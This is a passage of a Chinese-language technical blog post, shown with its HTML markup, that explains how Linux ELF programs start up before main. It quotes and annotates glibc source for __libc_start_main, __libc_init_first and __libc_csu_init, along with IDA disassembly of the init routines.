<span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">                     #ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">                     ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">                     #endif</span></span><br><span class="line"><span class="params">                     __typeof (main) init,</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure><ul><li>首先<code>push esp</code>，此时<code>esp</code>指向的是刚刚<code>push</code>进入栈中的<code>eax</code>的地址，也就是<code>__libc_start_main</code>函数栈的最高地址，也就是栈底</li><li>接着<code>push edx</code>，此时传递的是<code>dl_fini</code>函数的起始地址，也就是动态链接库的析构函数，执行和动态加载相关的析构工作</li><li>接着压入的是<code>fini</code>函数的地址，该函数执行<code>main</code>函数调用结束之后的收尾工作</li><li>接着压入的是<code>init</code>函数的地址，该函数执行<code>main</code>函数调用之前的初始化工作</li><li>接着压入的是<code>ecx</code>的值，此时<code>ecx</code>中存储的是<code>argv</code>的起始地址</li><li>接着压入的是<code>esi</code>的值，此时<code>esi</code>中存储的是<code>argc</code>的值</li><li>最后压入的是<code>main</code>函数的起始地址</li></ul><p>最终完成参数在栈中的布局如下</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020143314.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>但是我们注意到其没有传递环境变量的参数到<code>__libc_start_main</code>函数中，环境变量数组也不是该函数的参数。但是<code>main</code>函数的原型其实是<code>int main(int argc, char** argv, char** envp)</code>，那么程序是如何获取环境变量相关的数值的呢。我们会在后面的源码中看到函数设置了一个全局变量<code>_environ</code>，这样全局变量就可以在<code>libc_start_main</code>中的任何位置使用。全局变量指针的赋值是通过<code>argv</code>来进行的<code>&amp;argv[argc + 1]</code>。</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>在<code>__libc_start_main</code>函数中其执行流程如下</p><ol><li>设置<code>pthread</code>，启动线程</li><li>注册<code>fini</code>相关的函数</li><li>调用<code>init</code>函数</li><li>调用<code>main</code>函数，并将<code>argc,argv</code>和环境变量数组传递给<code>main</code>函数</li><li>调用<code>exit</code>函数，并将<code>main</code>函数的返回值传递给<code>exit</code>函数</li></ol><p>下面是函数的源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="type">int</span></span><br><span class="line">    <span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">                     #ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">                     ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">                     #endif</span></span><br><span class="line"><span class="params">                     __typeof (main) init,</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="comment">//判断是否是多个库</span></span><br><span class="line">    __libc_multiple_libcs = &amp;_dl_starting_up &amp;&amp; !_dl_starting_up;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">//设置环境变量</span></span><br><span class="line">    __environ = ev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Store the lowest stack address.  This is done in ld.so if this is</span></span><br><span class="line"><span class="comment">     the code for the DSO.  */</span></span><br><span class="line">    <span class="comment">//保存栈的最高地址</span></span><br><span class="line">    __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># <span class="keyword">ifdef</span> HAVE_AUX_VECTOR</span></span><br><span class="line">    <span class="comment">//处理辅助变量</span></span><br><span class="line">    <span class="comment">/* First process the auxiliary vector since we need to find the</span></span><br><span class="line"><span class="comment">     program header to locate an eventually present PT_TLS entry.  */</span></span><br><span class="line">    <span class="meta">#  <span class="keyword">ifndef</span> LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line">    ElfW(<span class="type">auxv_t</span>) *auxvec;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> **evp = ev;</span><br><span class="line">        <span class="keyword">while</span> (*evp++ != <span class="literal">NULL</span>)</span><br><span class="line">            ;</span><br><span class="line">        auxvec = (ElfW(<span class="type">auxv_t</span>) *) evp;</span><br><span class="line">        <span class="comment">//找到辅助变量的位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line">    _dl_aux_init (auxvec);</span><br><span class="line">    <span class="keyword">if</span> (GL(dl_phdr) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Starting from binutils-2.23, the linker will define the</span></span><br><span class="line"><span class="comment">         magic symbol __ehdr_start to point to our own ELF header</span></span><br><span class="line"><span class="comment">         if it is visible in a segment that also includes the phdrs.</span></span><br><span class="line"><span class="comment">         So we can set up _dl_phdr and _dl_phnum even without any</span></span><br><span class="line"><span class="comment">         information from auxv.  */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">extern</span> <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Ehdr)</span> __ehdr_start<span class="comment">//指向ELF文件的头部</span></span><br><span class="line">            __<span class="title function_">attribute__</span> <span class="params">((weak, visibility (<span class="string">&quot;hidden&quot;</span>)))</span>;</span><br><span class="line">        <span class="keyword">if</span> (&amp;__ehdr_start != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            assert (__ehdr_start.e_phentsize == <span class="keyword">sizeof</span> *GL(dl_phdr));</span><br><span class="line">            GL(dl_phdr) = (<span class="type">const</span> <span class="type">void</span> *) &amp;__ehdr_start + __ehdr_start.e_phoff;</span><br><span class="line">            GL(dl_phnum) = __ehdr_start.e_phnum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先前面的赋值部分不必多说，我们来看一下辅助变量。在赋值完环境变量之后就开始处理辅助变量，辅助变量同样存储在栈中，位于环境变量之后，两种相隔一个<code>NULL</code>字段。我们可以使用<code>info auxv</code>来查看辅助变量</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020153327.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>同样也可以设置环境变量<code> LD_SHOW_AUXV =1</code>来显示辅助变量。辅助变量是一种内核到用户空间的信息传递基址，在<code>elf</code>文件作为一个进程之前，加载器通过辅助变量传递给进程一些信息，这里可以看到<code>UID,GID,ENTRY</code>等信息，但是我们这里不再做过多的分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="type">int</span></span><br><span class="line">    <span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">                     #ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">                     ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">                     #endif</span></span><br><span class="line"><span class="params">                     __typeof (main) init,</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//环境变量和辅助变量的处理</span></span><br><span class="line">    <span class="meta"># <span class="keyword">ifdef</span> DL_SYSDEP_OSCHECK</span></span><br><span class="line">    <span class="keyword">if</span> (!__libc_multiple_libcs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//检查操作系统版本</span></span><br><span class="line">        <span class="comment">/* This needs to run to initiliaze _dl_osversion before TLS</span></span><br><span class="line"><span class="comment"> setup might check it.  */</span></span><br><span class="line">        DL_SYSDEP_OSCHECK (__libc_fatal);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Perform IREL&#123;,A&#125; relocations.  */</span></span><br><span class="line">    <span class="comment">//根据CPU架构进行初始化--这里没懂</span></span><br><span class="line">    apply_irel ();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the thread library at least a bit since the libgcc</span></span><br><span class="line"><span class="comment">     functions are using thread functions if these are available and</span></span><br><span class="line"><span class="comment">     we need to setup errno.  */</span></span><br><span class="line">    <span class="comment">//初始化pthread</span></span><br><span class="line">    __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置canary</span></span><br><span class="line">    <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line">    <span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">    THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line">    <span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">    __stack_chk_guard = stack_chk_guard;</span><br><span class="line">    <span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set up the pointer guard value.  */</span></span><br><span class="line">    <span class="comment">//设置canary的值</span></span><br><span class="line">    <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,</span><br><span class="line">                                                           stack_chk_guard);</span><br><span class="line">    <span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_POINTER_GUARD</span></span><br><span class="line">    THREAD_SET_POINTER_GUARD (pointer_chk_guard);</span><br><span class="line">    <span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">    __pointer_chk_guard_local = pointer_chk_guard;</span><br><span class="line">    <span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Register the destructor of the dynamic linker if there is any.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">        __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="comment">/* Call the initializer of the libc.  This is only needed here if we</span></span><br><span class="line"><span class="comment">     are compiling for the static library in which case we haven&#x27;t</span></span><br><span class="line"><span class="comment">     run the constructors in `_dl_start_user&#x27;.  */</span></span><br><span class="line">    <span class="comment">//初始化libc</span></span><br><span class="line">    __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Register the destructor of the program, if any.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fini)</span><br><span class="line">        __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Some security at this point.  Prevent starting a SUID binary where</span></span><br><span class="line"><span class="comment">     the standard file descriptors are not opened.  We have to do this</span></span><br><span class="line"><span class="comment">     only for statically linked applications since otherwise the dynamic</span></span><br><span class="line"><span class="comment">     loader did the work already.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">        __libc_check_standard_fds ();</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Call the initializer of the program, if any.  */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">        GLRO(dl_debug_printf) (<span class="string">&quot;\ninitialize program: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (init)</span><br><span class="line">        (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数首先是初始化了<code>thread</code>，然后在<code>atexit</code>中注册了<code>rtld_fini</code>和<code>fini</code>，以便完成在加载器和函数结束之后的清理工作。我们来看一下<code>__libc_init_first</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">    __libc_init_first (<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="comment">/* For DSOs we do not need __libc_init_first but instead _init.  */</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="type">void</span></span><br><span class="line">    attribute_hidden</span><br><span class="line">    _init (<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//连接上面的libc_init_first</span></span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> USE_NONOPTION_FLAGS</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="type">void</span> __getopt_clean_environment (<span class="type">char</span> **);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    __libc_multiple_libcs = &amp;_dl_starting_up &amp;&amp; !_dl_starting_up;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make sure we don&#x27;t initialize twice.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!__libc_multiple_libcs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Set the FPU control word to the proper default value if the</span></span><br><span class="line"><span class="comment"> kernel would use a different value.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__fpu_control != GLRO(dl_fpu_control))</span><br><span class="line">            __setfpucw (__fpu_control);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Save the command-line arguments.  */</span></span><br><span class="line">    __libc_argc = argc;</span><br><span class="line">    __libc_argv = argv;</span><br><span class="line">    __environ = envp;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    __libc_init_secure ();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First the initialization which normally would be done by the</span></span><br><span class="line"><span class="comment">     dynamic linker.  */</span></span><br><span class="line">    _dl_non_dynamic_init ();</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> VDSO_SETUP</span></span><br><span class="line">    VDSO_SETUP ();</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    __init_misc (argc, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> USE_NONOPTION_FLAGS</span></span><br><span class="line">    <span class="comment">/* This is a hack to make the special getopt in GNU libc working.  */</span></span><br><span class="line">    __getopt_clean_environment (envp);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize ctype data.  */</span></span><br><span class="line">    __ctype_init ();</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> defined SHARED &amp;&amp; !defined NO_CTORS_DTORS_SECTIONS</span></span><br><span class="line">    __libc_global_ctors ();</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从函数定义上来看，其实际上调用的是<code>_init</code>函数，执行了一些安全相关的初始化工作。</p><h5 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="_libc_csu_init"></a>_libc_csu_init</h5><p>接下来就是调用传入的<code>init</code>函数了，函数默认是<code>libc_csu_init</code>函数，源码位于<code>csu/elf-init.c</code>文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">    __libc_csu_init (<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* For dynamically linked executables the preinit array is executed by</span></span><br><span class="line"><span class="comment">     the dynamic linker (before initializing any shared object).  */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">    <span class="comment">/* For static executables, preinit happens right before init.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">size_t</span> size = __preinit_array_end - __preinit_array_start;</span><br><span class="line">        <span class="type">size_t</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            (*__preinit_array_start [i]) (argc, argv, envp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">    _init ();</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">//执行init_array中存储的函数指针</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> size = __init_array_end - __init_array_start;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里可以看出初始化节区执行的流程就是<code>preinit_array&gt;.init&gt;.init_array</code>。那么我们接下来看有喜爱<code>_init</code>函数，这里执行的是<code>init_proc</code>函数，我们看一下其汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.init:<span class="number">0804828</span>C _init_proc      proc near               ; CODE XREF: __libc_csu_init+<span class="number">1</span>C↓p</span><br><span class="line">.init:<span class="number">0804828</span>C                 push    ebx             ; _init</span><br><span class="line">.init:<span class="number">0804828</span>D                 sub     esp, <span class="number">8</span></span><br><span class="line">.init:<span class="number">08048290</span>                 call    __x86_get_pc_thunk_bx</span><br><span class="line">.init:<span class="number">08048295</span>                 add     ebx, <span class="number">1</span>D6Bh</span><br><span class="line">.init:<span class="number">0804829B</span>                 mov     eax, ds:(__gmon_start___ptr - <span class="number">804</span>A000h)[ebx]</span><br><span class="line">.init:<span class="number">080482</span>A1                 test    eax, eax</span><br><span class="line">.init:<span class="number">080482</span>A3                 jz      <span class="type">short</span> loc_80482AA</span><br><span class="line">.init:<span class="number">080482</span>A5                 call    __gmon_start__</span><br><span class="line">.init:<span class="number">080482</span>AA</span><br><span class="line">.init:<span class="number">080482</span>AA loc_80482AA:                            ; CODE XREF: _init_proc+<span class="number">17</span>↑j</span><br><span class="line">.init:<span class="number">080482</span>AA                 add     esp, <span class="number">8</span></span><br><span class="line">.init:<span class="number">080482</span>AD                 pop     ebx</span><br><span class="line">.init:<span class="number">080482</span>AE                 retn</span><br><span class="line">.init:<span class="number">080482</span>AE _init_proc      endp</span><br><span class="line">.init:<span class="number">080482</span>AE</span><br><span class="line">.init:<span class="number">080482</span>AE _init           ends</span><br></pre></td></tr></table></figure><p>这里我们频繁遇到了下面的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call __x86.get_pc_thunk.bx</span><br><span class="line">add  ebx, $_GLOBAL_OFFSET_TABLE_</span><br></pre></td></tr></table></figure><p>这里第一个<code>call</code>其实是获取当前<code>eip</code>的地址并保存在<code>ebx</code>中，其做法就是把当前的<code>esp</code>中存储的地址赋值到<code>ebx</code>中，因为<code>call</code>指令会将下一条指令压入栈中。<code>$_GLOBAL_OFFSET_TABLE_</code>则表示的是当前代码与位置无关代码<code>got</code>之间的差值，执行完毕之后<code>ebx</code>就指向了<code>got</code>表的地址。</p><p>首先函数判断了是否进行<code>gmon_start</code>函数的调用，该函数是调用一个例程开始<code>profiling</code>，并且在<code>at_exit</code>中注册了一个清理函数，并且在运行结束的时候生成<code>gmon.out</code>文件。如果未设置调用该函数，则直接返回。</p><blockquote><p>调用该函数需要在编译的时候加入<code>-pg</code>选项</p></blockquote><p>调用完<code>_init</code>函数之后就开始调用<code>.init_array</code>中存储的函数，我们看一下保存的函数指针的内容</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020213513.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>函数指向的是<code>08049f08</code>，而其中存储的内容为</p><img src="https://raw.githubusercontent.com/liuzhongchina521/Bimage/master/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/main%E5%87%BD%E6%95%B0%E5%90%AF%E5%8A%A8%E5%88%86%E6%9E%90/20191020213635.png" alt="图片无法显示，请设置GitHub代理" title=" "><p>我们在<code>ida</code>中看一下该函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:080483B0 frame_dummy     proc near               ; CODE XREF: __libc_csu_init+44↓p</span><br><span class="line">.text:080483B0                                         ; DATA XREF: .init_array:__frame_dummy_init_array_entry↓o</span><br><span class="line">.text:080483B0                 mov     eax, offset __JCR_LIST__</span><br><span class="line">.text:080483B5                 mov     edx, [eax]</span><br><span class="line">.text:080483B7                 test    edx, edx</span><br><span class="line">.text:080483B9                 jnz     short loc_80483C0</span><br><span class="line">.text:080483BB</span><br><span class="line">.text:080483BB loc_80483BB:                            ; CODE XREF: frame_dummy+17↓j</span><br><span class="line">.text:080483BB                 jmp     short register_tm_clones</span><br><span class="line">.text:080483BB ; -----------------------------------------------------------------------</span><br><span class="line">.text:080483BD                 align 10h</span><br><span 